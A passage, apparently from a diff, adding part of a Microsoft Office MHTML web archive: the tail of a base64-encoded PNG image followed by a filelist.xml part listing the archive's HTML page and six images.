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
+AElFTkSuQmCC
+
+------=_NextPart_01D282BC.499D8C10
+Content-Location: file:///C:/D1AFCA88/file8792.files/filelist.xml
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/xml; charset="utf-8"
+
+<xml xmlns:o=3D"urn:schemas-microsoft-com:office:office">
+ <o:MainFile HRef=3D"../file8792.htm"/>
+ <o:File HRef=3D"image001.png"/>
+ <o:File HRef=3D"image002.png"/>
+ <o:File HRef=3D"image003.png"/>
+ <o:File HRef=3D"image004.png"/>
+ <o:File HRef=3D"image005.png"/>
+ <o:File HRef=3D"image006.png"/>
+ <o:File HRef=3D"filelist.xml"/>
+</xml>
+------=_NextPart_01D282BC.499D8C10--
